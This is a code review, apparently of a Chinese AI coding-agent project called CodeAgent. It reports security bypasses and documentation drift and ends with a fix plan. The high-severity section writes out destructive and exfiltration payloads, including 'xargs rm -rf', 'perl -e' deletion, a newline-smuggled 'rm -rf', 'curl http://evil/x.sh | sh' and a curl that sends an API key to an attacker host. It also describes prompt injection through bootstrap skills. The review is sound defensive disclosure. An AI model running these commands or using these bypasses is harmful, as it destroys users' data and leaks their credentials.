# CodeAgent 全面评审

> **🔖 核验标记（2026-08-25）**
> 本文档已对照当前代码树逐条复核（静态读码 + 实证运行），结论如下：
> - **8 条高危全部属实**；其中 H1 经实证复现（`printf '/' | xargs rm -rf`、`perl/ruby -e` 均 ALLOW，字面 `/` 载荷确被拦截，与「关键核验修正」一致）；
> - **21 条中危全部属实**，37 条低危/提示基本全数核实；
> - 10 条待复核中 9 条逻辑核实成立，仅 `app/main.py:218` 竞态未能证实触发路径；3 条已反驳均成立；
> - **唯一未复现项**：H7 声称的 `test_cli::test_stdin_mode_returns_reply` 顺序相关 flaky——本机两次全量运行均 **804 collected / 804 passed / 0 failed**，test_cli 独立连跑 5 次全绿（基线漂移「666→804」本身属实）；
> - 配套实测：`openspec validate --specs` 11 份主规格全部通过（文档写 9，漂移属实）。

> 评审日期：2026-08-25
> 评审范围：当前代码树、测试、CI 与文档（含近两周新增的 composition/、task 模式、store_index、execution 等模块）
> 评审方法：10 维度并行深度审查（90 个评审代理）→ 每条发现对抗性逐条验证（独立代理读码尝试反驳）→ 完整性评论。主评审对全部 8 条高危亲自读码复核，并对 bash 黑名单绕过做了实证测试。
> 结论统计：**66 条确认发现**（8 高危 / 21 中危 / 31 低危 / 6 提示）+ 10 条待复核 + 3 条已反驳。

## 执行摘要

CodeAgent 已经明显超越"概念验证"：自研 ReAct 循环的终止/超时/abort 路径清晰，分层解耦主体健康（core/session/ai/tools 之间的静态 import 零违规，textual 严格限定在引擎文件），会话存储层用「JSONL 真相源 + 流式索引 + 源指纹校验 + 临时文件原子替换」的设计扎实，SSE 解析对供应商差异的宽容处理充分，FakeClient 支撑起 804 项全绿离线测试。上一次审计（2026-08-21/24）确认的缺陷在后续提交中大多已闭环。

但本次评审的问题集中在两条主线：

**① 安全控制没有形成闭环（5 条可利用绕过）。** bash 危险命令黑名单可被「目标经前段产生」（`printf '/' | xargs rm -rf`）或「其它解释器单行」（`perl/ruby -e`）整体绕过并静默执行（headless 与 TUI 均无确认）；S-3 密钥保护只覆盖 read/write/edit 与 bash，`grep` 工具可直接读取 `~/.codeagent/.env` 再配合 allow 的 curl 外传；任务验证命令从不可信 `pyproject.toml` 读取且只经一个可绕过正则就直达 `/bin/sh -lc`；项目级 bootstrap 技能全文注入 system prompt（系统级提示注入）；ask/plan 只读模式可被换行符分隔命令与 MCP 工具绕过。这五条叠加成「恶意仓库 / 提示注入 → 静默执行任意命令 + 密钥外传」的完整攻击面。

**② 文档-代码漂移（13 处）。** 测试基线「666」已过期为 804 且存在顺序相关 flaky；事件类型「11 类」实际 23 类；组合根已从 container.py 拆到 app/composition/ 但 CLAUDE.md 未同步；CLAUDE.md 引用的 `docs/review/audit-2026-08-21.md` 已不存在；v0.4 迭代文档声称「尚未开始」但 store_index 等已落地。文档的滞后会削弱验收门禁的可信度，也会误导新加入者。

建议优先级：先在一周内闭合安全闭环（黑名单补包装/换行符、grep/find/ls 接入密钥硬拒绝、verify 命令走黑名单+确认环、bootstrap 加信任标记），再修可靠性（decoupling 测试盲点、headless 错误可见性、孤儿进程超时），最后统一同步文档基线。

## 关键核验修正

一处工作流结论经主评审实证测试后需要修正：

> **「bash 黑名单可被 `xargs rm -rf /` 绕过」载荷不精确。** 实测 `xargs rm -rf /`（带字面 `/`）会被字符串正则拦截（DENY）。漏洞类**真实存在**，但可复现载荷是：
> - `printf '/' | xargs rm -rf`（目标由前一段产生，不在命令文本内）→ 两条安全层全部 ALLOW；
> - `perl -e "system('rm','-rf','/')"` / `ruby -e "..."`（解释器 -e 不在包装器集合、无 ASK 规则）→ ALLOW。
>
> 本报告所有相关表述均按此修正后为准。其余 7 条高危均由主评审亲自读码复核，结论与工作流一致。

## 评审结论总览

| 级别 | 数量 | 含义 |
| --- | ---: | --- |
| 高危 HIGH | 8 | 可直接造成数据破坏、密钥泄露或系统级指令注入 |
| 中危 MEDIUM | 21 | 可靠性、契约一致性或用户可见缺陷 |
| 低危 LOW | 31 | 死代码、边界缺口、弱测试与陈旧示例 |
| 提示 INFO | 6 | 无功能影响，但陈旧表述会误导 |
| 待复核 | 10 | 逻辑成立但缺确定触发路径 |
| 已反驳 | 3 | 对抗验证证明不成立，避免后续重提 |

## 高危发现（8）

### H1. bash 危险命令黑名单可绕过 → 破坏命令静默执行（无确认）

- **位置**：`src/codeagent/tools/atomic/bash.py:387` + `tools/security.py:149`
- **根因**：`_rm_segment_danger` 要求段首字面 `rm`（`_effective_command_index` 只跳过 sudo/env/time/nohup/command）；`_INTERPRETER_WRAPPERS` 仅含 bash/sh/zsh；字符串正则要求字面 `rm -rf /`。于是「目标经前段产生」与「经其它解释器执行」两种形态整体绕过 deny 黑名单，`classify_bash` 的敏感规则表也无对应规则 → ALLOW，headless 与 TUI 均无确认。
- **触发路径**：注入指令 `echo / | xargs rm -rf` → 策略 allow → `bash -lc 'echo / | xargs rm -rf'` 实际执行 `rm -rf /`。已实证复现 ALLOW 判定。
- **复核**：主评审亲自运行检测函数验证，并修正了载荷（见上）。

### H2. grep/find/ls 绕过密钥硬拒绝 → 可读取 ~/.codeagent/.env 并外传

- **位置**：`src/codeagent/tools/security.py:388`
- **根因**：`classify_tool` 只分类 bash/read/write/edit/mcp，grep/find/ls 落入默认 ALLOW。S-3 的 `_secret_path_hit` 硬拒绝仅作用于 read/write/edit 的 classify_file 与 bash 的 token 检查——`read` 工具读 .env 会被拒，`grep` 工具读同一文件却完全不受约束。
- **触发路径**：注入指令 `grep pattern="API_KEY" path="~/.codeagent"` → 工具把 .env 中的 `DEEPSEEK_API_KEY=sk-…` 整行返回给模型 → 模型执行 `curl https://attacker/collect -d "key=sk-…"`（命令文本不含 .env/.codeagent 字面 → allow）→ 密钥外传，绕过 S-3。

### H3. 任务验证命令任意执行（来源不可信 pyproject.toml）

- **位置**：`src/codeagent/app/task_verification.py:313`
- **根因**：`VerificationRunner._execute` 直接 `/bin/sh -lc` / `cmd /c` 执行，不经 BashTool 黑名单、不经确认环、继承完整父进程环境（无 bash 工具的 env 白名单）。唯一门禁 `is_mutating_command` 是较弱正则，可被换行符 / `curl|sh` / xargs 绕过。命令来源 `VerificationCommandResolver._from_project_config` 直接读仓库 `pyproject.toml [tool.codeagent] verify`。
- **触发路径**：恶意仓库写 `[tool.codeagent] verify = "curl http://evil/x.sh | sh"`，用户在仓库内跑任务模式 → 验证阶段以用户权限静默执行。

### H4. 项目级 bootstrap 技能全文注入 system prompt（系统级提示注入）

- **位置**：`src/codeagent/app/skill_runtime.py:69` + `app/skills.py:339`
- **根因**：`build_bootstrap_prompt` 把 bootstrap 技能的 SKILL.md 正文以「强制工作流入口」标签原样注入 system prompt（最高信任层）。项目作用域包从 `<cwd>/.codeagent/registry.json` 读取，校验仅路径包含关系，仓库可自洽满足，无「经安装命令生成」的信任标记。
- **触发路径**：恶意仓库提交 `.codeagent/registry.json` + bootstrap SKILL.md，在任何工作区打开会话即完成注入，且发生在用户可见会话开始之前；正文可指令模型执行上述 allow 变体命令。

### H5. is_mutating_command 正则可被换行符分隔命令绕过 → 只读门禁失效

- **位置**：`src/codeagent/app/task_modes.py:86`
- **根因**：`_MUTATING_COMMAND_RE` 分隔符类 `(?:^|[;&|])` 不含换行符 `\n`（正则未用 MULTILINE）。`'pytest\nrm -rf /tmp/x'` 返回 False。此函数同时是 `VerificationRunner.run` 的唯一门禁与 `_ModePolicy` 的 ask/plan 变更检测。
- **触发路径**：仓库投毒 `[tool.codeagent] verify = "python -m pytest\nrm -rf $HOME/data"` → is_mutating_command 返回 False → shell 原样执行 rm -rf，无任何确认。主评审亲自构造载荷验证返回 False。

### H6. 分层强制测试 config 轴是死代码，ai→app 倒置依赖逃逸判据

- **位置**：`tests/test_decoupling.py:44`
- **根因**：`_forbidden_for` 的禁止列表含 `codeagent.config`，但该包已不存在（config 实际位于 `codeagent.app.config`），对任何文件都不生效——「禁止 import config」规则形同虚设。ai/ 的禁止列表不含 `codeagent.app`，于是 8 处 `ai→codeagent.app.config` 导入（factory/catalog/store + 6 个 provider）不被抓；实测 test_decoupling 106 项全绿。
- **影响**：「组合根唯一跨层交汇点」的保证在 CI 中失效；ai 层无法脱离 app/config 独立复用。

### H7. 测试基线 666 严重漂移（实测 804 collected，且存在顺序相关 flaky）

- **位置**：`CLAUDE.md:29`
- **问题**：CLAUDE.md/README/CHANGELOG/architecture.md/v0.3 共 12+ 处写「666 收集 / 665 passed / 1 skipped / 无失败」。实测 804 collected；两次全量运行分别得到 803 passed + 1 failed（`test_cli.py::test_stdin_mode_returns_reply` 顺序相关失败）与 804 passed + 0 failed。修复计划文档已自认漂移，但其数字也已过期。
- **影响**：文档基线无法作为验收依据，且顺序相关失败说明存在测试间状态泄漏。

### H8. 分层规则描述与 test_decoupling 实际校验不一致（组合根已拆分）

- **位置**：`CLAUDE.md:45`
- **问题**：CLAUDE.md 写「仅 app/container.py / app/main.py 可跨层 import」，但 test_decoupling.py:38-39 已把整个 `app/composition/` 目录列为跨层全允许，container.py 也已瘦身为 63 行 façade（装配在 composition/ 各模块）。app/main.py 的 docstring 已同步，CLAUDE.md 未同步。
- **影响**：读者按文档口径会把 app/composition/ 误判为分层违规；新增组合模块时文档口径与测试口径冲突。

## 中危发现（21）

| # | 维度 | 位置 | 问题 |
| --- | --- | --- | --- |
| M1 | architecture | `app/tui/view.py:31` | app/tui 直接依赖 core.events 与 session.tree，与「本包不跨层」文档矛盾；test_decoupling 对 app/tui/ 不禁止 core/session |
| M2 | architecture | `core/ports.py:80` | ToolExecutionRuntimePort 契约与 loop 调用不一致（多余 operation_id 关键字），且 tool_runtime 端口从未被组合根装配，cancel_all 全仓无调用方 |
| M3 | session | `session/session.py:455` | 成功轮次提交后自动压缩失败把异常从 run() 上抛且不记 last_failure，已落盘成功轮被判崩溃 |
| M4 | session | `session/session_runtime.py:26` | steer() 注入消息在 run 结束后无消费点，残留到下一轮被当独立 user 消息 |
| M5 | ai | `ai/transport/openai_compat.py:75` | 默认超时 read=None 无差别作用于非流式 generate；timeout/max_retries 无法从配置注入 |
| M6 | ai | `ai/transport/openai_compat.py:311` | stream() 对 200 但非 SSE 的错误响应体静默吞掉，零事件零异常 |
| M7 | tools | `tools/atomic/bash.py:387` | 危险命令黑名单与确认环可被 xargs/while 包装整体绕过（与 H1 同源） |
| M8 | tools | `tools/atomic/bash.py:632` | bash 超时分支返回未截断的完整 stdout+stderr（绕过 30k 截断），且 proc.wait() 无超时兜底 |
| M9 | security | `tools/security.py:338` | read 越界读仅 allow+warning 且告警只回灌模型（headless 不可见），可读 SSH 私钥并配合 curl 外传 |
| M10 | tui | `app/tui/components.py:533` | 退出文档不含折叠工具块的结果内容，与「完整文档」声明不符 |
| M11 | tui | `app/tui/view.py:1147` | Esc 空闲退出契约与实现失配（端口/模块 docstring 未随键位拆分更新） |
| M12 | app | `app/main.py:233` | headless 丢弃 ERROR 事件 payload，模型失败的可操作原因对用户不可见 |
| M13 | app | `app/task_verification.py:77` | WorkspaceInspector 排除清单缺构建产物目录（target/bin/obj 等），验证产物污染变更报告与修复循环 |
| M14 | tests | `tests/test_decoupling.py:65` | AST 扫描两处可绕过：`from codeagent import tools`（names 忽略）与 level>0 相对导入整体跳过 |
| M15 | docs | `CLAUDE.md:67` | 事件类型「11 类」漂移：core/events.py 实际 23 个 EventType 常量 |
| M16 | docs | `CLAUDE.md:9` | 多处文档引用不存在的 `docs/review/audit-2026-08-21.md`（共 5 处悬空） |
| M17 | docs | `CLAUDE.md:51` | 新模块（core/execution.py、app/composition/、app/task_*、session/store_index.py 等）未纳入模块职责与目录树 |
| M18 | docs | `CLAUDE.md:19` | TUI Esc 空闲退出行为文档与代码不符：Esc 仅中断，Ctrl+C/Ctrl+Q 退出 |
| M19 | docs | `CLAUDE.md:29` | openspec validate --specs「9 passed」漂移：实际 11 份主规格 |
| M20 | reliability | `app/task_verification.py:322` | 超时只 kill 直接子进程，孤儿孙进程持有 stdout 管道使 communicate() 无限阻塞，TaskSupervisor 挂死 |
| M21 | reliability | `app/task_modes.py:104` | ASK/PLAN 只读门禁不覆盖 MCP 工具，只读模式可执行变更型 mcp 调用 |

## 低危 / 提示（37）

| 级别 | 维度 | 位置 | 问题 |
| --- | --- | --- | --- |
| low | architecture | `app/container.py:9` | façade re-export 15+ 私有下划线符号，私有实现被锁进公共契约 |
| low | architecture | `core/loop.py:132` | _execute_one 为无调用方死代码 |
| low | architecture | `pyproject.toml:12` | textual 为硬依赖，headless-only 安装被迫携带整个 TUI 引擎 |
| low | core | `core/execution.py:87` | _is_cancellable 与 _cleanup 检测不同方法集，超时可能误报「已清理」 |
| low | core | `core/messages.py:221` | 同批重复 tool_call_id 时 pending 只留最后一个，其余静默丢弃 |
| low | core | `core/loop.py:113` | 流式路径未对空 tool_call_id 兜底（generate 路径有 uuid 兜底） |
| low | core | `core/loop.py:98` | 模型流中途异常时 MODEL_REQUEST_FINISHED 不发出，事件对缺失 |
| low | session | `session/session_persistence.py:118` | commit_turn 逐条追加消息非原子，中途 IO 失败内存与 store 分叉 |
| low | session | `session/bus.py:41` | EventBus.emit_errors 无限累积，异常订阅方导致长会话内存增长 |
| low | session | `session/manager.py:154` | replace_ports 只写当前会话 model_change，非当前持久化会话 header 陈旧 |
| low | ai | `ai/catalog/store.py:78` | models.json 的 context_window 字段被静默丢弃，无法覆盖压缩阈值 |
| low | ai | `ai/providers/deepseek.py:58` | 显式 model:effort 内联后缀在 spec.reasoning=False 时被静默丢弃 |
| low | ai | `ai/factory.py:46` | get_available_providers 会列出只有目录没有工厂的 provider |
| low | tools | `tools/atomic/find.py:80` | find 模式以 ** 结尾时匹配不到任何文件 |
| low | tools | `tools/shared/textfile.py:38` | 混合换行文件经 edit 后未触碰区被改写，违反字节不变承诺 |
| low | tools | `tools/atomic/write.py:35` | write 就地截断写而非原子写，中断留下损坏文件 |
| low | security | `tools/security.py:360` | MCP 未配置 permissions 时默认全放行，服务器输出直接回灌模型（提示注入面） |
| low | tui | `app/tui/view.py:1391` | 每帧重置 context_stale，「上下文同步中」指示永不显示 |
| low | tui | `app/tui/view.py:303` | 运行中补全值确认绕过 _submit 运行门禁，可热切换端口/会话 |
| low | app | `app/main.py:88` | 会话构造与 switch 的预期失败未捕获，CLI 裸 traceback |
| low | app | `app/main.py:106` | headless 失败轮次仍以退出码 0 结束，脚本/CI 无法感知失败 |
| low | app | `app/task_modes.py:70` | /ask /plan /code 无参数时执行一次空文本轮次 |
| low | app | `app/task_verification.py:95` | 每轮任务对整个工作区全量哈希 + git status，大仓库开销明显 |
| low | tests | `tests/tools/test_tools.py:374` | grep 无匹配测试用 \|\| true 强制退出码 0，掩盖被测行为 |
| low | tests | `tests/core/test_loop.py:74` | 事件顺序断言带条件恒真兜底，TURN_END 缺失时静默通过 |
| low | tests | `session/store_index.py:172` | store_index.py 325 行无独立单测，read_valid 类型校验分支未覆盖 |
| low | tests | `session/store_codec.py:19` | _derive_title 空白折叠与空内容分支、_now 时间格式无直接单测 |
| low | tests | `tests/test_skills.py:176` | Windows 上静默 return，报告 passed 而非 skipped |
| low | docs | `docs/iteration/v0.4.md:227` | 「v0.4 尚未开始/全🔲」与实际已实现的 store_index 等不符 |
| low | docs | `CLAUDE.md:88` | 大文件行数示例漂移：view.py 768→1400 行、components.py 707→1250 行 |
| low | docs | `CLAUDE.md:18` | --continue/--session/--list-sessions 与 codeagent skill 子命令未记录 |
| info | core | `core/loop.py:132` | _execute_one 死代码且每调用新建 max_concurrency=1 runtime，与并行路径矛盾 |
| info | core | `core/loop.py:424` | for…else 分支不可达；模块 docstring 事件数陈旧（10→实际 12+） |
| info | tools | `tools/atomic/grep.py:79` | 空文件上可空匹配内部计数 1 但渲染零行，自相矛盾 |
| info | tools | `tools/atomic/read.py:44` | read 先整块读入内存再截断，大文件峰值内存剧增 |
| info | app | `app/skill_packages.py:439` | codeagent skill reload 实质是 no-op，CLI 却提示「已重新加载」 |
| info | tests | `CLAUDE.md:29` | 测试基线过期（实测 804 collected / 804 passed / 0 skipped） |

## 各维度健康度

| 维度 | 总体判断 |
| --- | --- |
| 架构与分层 | 分层主体健康：core/session/ai/tools 静态 import 零违规、textual 严格限定引擎文件、app/composition 无环 DAG。判据三处盲点：config 轴死代码、TUI 直接依赖 core/session、tool_runtime 端口未装配。 |
| 自研编排核心 | 循环健壮（终止/超时/abort 路径清晰、并行 gather 保序、事件与消费方基本一一对应）。主要问题在契约一致性（operation_id）与边缘防御（空/重复 tool id、流中途异常事件缺失）。 |
| 有状态会话 | 整体健康：成功落盘/失败回滚语义正确，JSONL+流式索引+指纹校验+原子替换设计扎实，EventBus 异常隔离。run() 收尾自动压缩上抛、steer 残留是主要风险。 |
| 模型层 | 传输层健壮：SSE 对供应商差异宽容处理充分，重试「首帧后不再重试」防重复消耗正确，7 个 provider 配置隔离到位。超时 read=None 无差别、200 非 SSE 错误体静默吞掉。 |
| 工具层 | FsOps 端口注入、resolve_to_cwd 统一路径解析、mutation_queue 写串行化、双保险黑名单都是扎实设计。中危集中在超时绕过截断、黑名单可被包装绕过。 |
| 安全深潜 | 最薄弱的一维：多条件可利用的绕过使核心安全控制未闭环——黑名单绕过、密钥经 grep 外传、verify 命令任意执行、bootstrap 系统级提示注入、只读门禁可绕。 |
| 交互式终端 | 端口契约清晰、事件归约严谨（重复结果去重、旧会话事件丢弃正确）。退出文档「完整」声明不符、Esc 契约失配、若干并发小窗口；未发现高危正确性缺陷。 |
| CLI/配置/服务 | config extra=ignore 隔离与 H10 固定配置目录落实到位，组合根经 composition/ 按职责装配。短板是用户可见失败路径：headless 丢 ERROR、退出码恒 0、裸 traceback。 |
| 测试质量 | 804 全绿，安全回归覆盖关键绕过变体，行为断言为主。不足：decoupling 测试可绕过、少数 \|\| true/恒真断言/Windows 静默 return、store_index/store_codec 无单测。 |
| 文档一致性 | 对 v0.3 基线大体准确，但近两周漂移明显：测试 666→804、事件 11→23、组合根拆分、新模块缺失、5 处悬空引用。修复计划与成熟度评估已内部自认部分漂移。 |

## 待复核（10）

对抗验证为「逻辑成立但缺确定触发路径」，值得后续专项确认：

- `core/loop.py:281` — ToolExecutionRuntimePort 签名未声明 operation_id，循环却以关键字传入（与 M2 同源）
- `core/loop.py:87` — `event.tool_index or 0` 把缺失 index 的多工具流合并成一个调用（当前生产者均显式设 index，暂不可触发）
- `session/session.py:282` — 首次压缩 compaction entry 的 parent_id 指向保留窗口内消息（无当前可观测缺陷）
- `session/session.py:187` — close()/dispose() 只 cancel 不 await，资源释放可能先于回滚收尾
- `session/session.py:426` — abort 取消路径下 TURN_END 的 terminal_phase 恒为 idle，与取消状态不符
- `ai/model_pattern.py:14` — 模型名末节恰为合法 effort 关键字时错误切分，非法 effort 报错无提示
- `tui/runtime.py:211` — 三元表达式优先级使 TOOL_* 事件 current_operation 可渲染为字符串「None」（已复现）
- `tui/view.py:736` — /skills 与 /compact 直接 create_task(session.run/compact)，绕过 running 门禁（已代码+实验双重证实）
- `tui/view.py:1298` — _on_event 无防御式 try/except，回调异常被事件总线静默吞掉致 UI 冻结
- `app/main.py:218` — _respond 事件消费存在同时完成竞态，可能丢失/混入最终回复文本

## 已反驳（3）

对抗验证通过阅读代码与引用链证明不成立，一并记录以避免后续重提：

- `app/composition/runtime_factory.py:56` — 以 id(ports) 作全局 runtime 注册表键会命中陈旧 runtime：**反驳**——强引用链使旧 ports 不会被 GC，id 复用前提不成立。
- `app/main.py:22` — headless 用字符串常量匹配事件类型存在静默失效风险：**反驳**——常量值与 EventType 一致且 main.py 属组合根例外，风险不存在。
- `core/loop.py:169` — _await_confirmation 丢弃乱序响应后继续阻塞致确认挂起：**反驳**——确认是同步 emit→await 串行处理，无并发乱序窗口。

## 做得好的方面

- **分层解耦主体真实**：core/session/ai/tools 静态 import 零违规，textual 严格限定 textual_backend.py，测试有防空转断言。
- **组合根拆分干净**：app/composition/ 无环 DAG，container.py 瘦身为 façade，跨层交汇点清晰。
- **存储层设计扎实**：JSONL 真相源 + 流式索引 + 源指纹（size/mtime）校验 + 临时文件原子替换 + apply_record 增量缓存。
- **安全回归文化好**：bash 黑名单有字符串正则+语义级双保险，S-1/S-2/S-3 修复均配回归测试覆盖等价写法、路径穿越、确认环三档、密钥拦截。
- **SSE 解析充分宽容**：覆盖 usage 独立帧、tool_calls 参数分片、帧间无空行、[DONE] 独立行等供应商差异；重试「首帧后不再重试」防重复消耗。
- **离线可测**：FakeClient 脚本化（steps/responses/tool_calls/thinking/usage/call_history）+ 内存 FsOps，核心编排零网络零密钥可测，804 项全绿。
- **事件驱动契约成形**：CLI/TUI/测试/CI 都经事件订阅感知进度，而非拿单返回值；TUI 事件归约对重复/旧会话事件做了正确丢弃。

## 建议修复顺序

### 阶段 0 · 安全闭环（约 1 周）

1. bash 黑名单补 xargs/解释器 -e/换行符/目标错位检测（或把 grep/find/ls/verify 统一收敛到同一安全分类器）；
2. grep/find/ls 工具接入 `_secret_path_hit` 硬拒绝；
3. VerificationRunner 改走 BashTool 黑名单 + 确认环 + env 白名单，`is_mutating_command` 补 MULTILINE 与 `\n`；
4. bootstrap 技能加「经安装命令生成」信任标记，项目源提示注入需确认；
5. `_ModePolicy` 覆盖 `mcp__` 前缀与只读语义。

### 阶段 1 · 可靠性与可观测（1-2 周）

- decoupling 测试补 ImportFrom names + 相对导入（并修 config 轴）；
- headless 聚合 ERROR payload 并映射退出码；
- VerificationRunner 超时改落文件 + 兜底 wait；
- session 自动压缩/steer/commit 原子性；
- bash 超时分支补截断。

### 阶段 2 · 文档与门禁（2-4 周）

- 统一同步 CLAUDE.md/README/CHANGELOG（测试基线、事件类型、组合根、新模块、Esc 键位、新 CLI 参数）；
- 补 store_index/store_codec 单测与 test_loop 恒真断言；
- 定位 test_cli 顺序相关 flaky；
- 将 textual 移入 optional-dependencies。

## 评审未覆盖维度（供后续评审参考）

- 性能与热点剖析（全量工作区哈希、capture 的 git subprocess、每轮重建 runtime）
- 可观测性与日志（日志质量、错误上报链路、指标采集）
- 依赖与供应链（pyproject/uv.lock 版本固定、传递依赖、供应链验证）
- 用户可见文案与 i18n（中英混排、错误/状态文案一致性）
- 资源与进程生命周期（线程/子进程/文件句柄泄漏、atexit 收尾顺序、孤儿进程清理）
